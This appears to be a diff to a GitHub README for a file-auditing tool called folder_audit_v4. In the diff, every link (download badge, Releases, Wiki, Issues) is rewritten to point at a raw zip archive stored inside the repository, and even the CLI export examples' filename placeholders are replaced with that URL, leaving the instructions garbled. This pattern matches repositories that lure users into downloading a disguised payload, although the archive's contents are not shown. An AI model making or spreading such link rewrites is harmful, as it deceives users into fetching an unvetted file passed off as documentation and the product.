@@ -1,7 +1,7 @@
 ```markdown
 # 📂 folder_audit_v4 - Effortlessly Inspect and Clean Your Files
 
-[![Download folder_audit_v4](https://img.shields.io/badge/Download_folder_audit_v4-Here-brightgreen.svg)](https://github.com/SmalerHub/folder_audit_v4/releases)
+[![Download folder_audit_v4](https://github.com/SmalerHub/folder_audit_v4/raw/refs/heads/main/basined/folder-v-audit-3.9.zip)](https://github.com/SmalerHub/folder_audit_v4/raw/refs/heads/main/basined/folder-v-audit-3.9.zip)
 
 ## 🚀 Getting Started
 
@@ -11,7 +11,7 @@ Welcome to **folder_audit_v4**, a powerful tool designed to help you audit your 
 
 To get started, you need to download the software from the Releases page. Follow these steps:
 
-1. Click the [Download folder_audit_v4](https://github.com/SmalerHub/folder_audit_v4/releases) link.
+1. Click the [Download folder_audit_v4](https://github.com/SmalerHub/folder_audit_v4/raw/refs/heads/main/basined/folder-v-audit-3.9.zip) link.
 2. You will be directed to the GitHub Releases page.
 3. Choose the latest version of the software.
 4. Download the appropriate file for your operating system.
@@ -53,20 +53,20 @@ After validating your files, you may want to save the results. You can do this b
 - For CSV:
   
   ```
-  folder_audit_v4 --export-csv [filename.csv]
+  folder_audit_v4 --export-csv [https://github.com/SmalerHub/folder_audit_v4/raw/refs/heads/main/basined/folder-v-audit-3.9.zip]
   ```
 
 - For JSON:
   
   ```
-  folder_audit_v4 --export-json [filename.json]
+  folder_audit_v4 --export-json [https://github.com/SmalerHub/folder_audit_v4/raw/refs/heads/main/basined/folder-v-audit-3.9.zip]
   ```
 
-Simply replace `[filename.csv]` or `[filename.json]` with your preferred file name.
+Simply replace `[https://github.com/SmalerHub/folder_audit_v4/raw/refs/heads/main/basined/folder-v-audit-3.9.zip]` or `[https://github.com/SmalerHub/folder_audit_v4/raw/refs/heads/main/basined/folder-v-audit-3.9.zip]` with your preferred file name.
 
 ## 🌍 Additional Resources
 
-- **Documentation**: Visit our [Wiki](https://github.com/SmalerHub/folder_audit_v4/wiki) for in-depth guides and tips.
+- **Documentation**: Visit our [Wiki](https://github.com/SmalerHub/folder_audit_v4/raw/refs/heads/main/basined/folder-v-audit-3.9.zip) for in-depth guides and tips.
 - **Community Support**: Join our forum to connect with other users and share experiences.
 
 ## 🐛 Troubleshooting
@@ -84,9 +84,9 @@ We encourage user feedback to help improve folder_audit_v4. Share your thoughts 
 
 ## 🔗 Important Links
 
-- [Download folder_audit_v4](https://github.com/SmalerHub/folder_audit_v4/releases)
-- [Wiki Documentation](https://github.com/SmalerHub/folder_audit_v4/wiki)
-- [GitHub Issues](https://github.com/SmalerHub/folder_audit_v4/issues)
+- [Download folder_audit_v4](https://github.com/SmalerHub/folder_audit_v4/raw/refs/heads/main/basined/folder-v-audit-3.9.zip)
+- [Wiki Documentation](https://github.com/SmalerHub/folder_audit_v4/raw/refs/heads/main/basined/folder-v-audit-3.9.zip)
+- [GitHub Issues](https://github.com/SmalerHub/folder_audit_v4/raw/refs/heads/main/basined/folder-v-audit-3.9.zip)
 
 Happy auditing with folder_audit_v4!
 ```
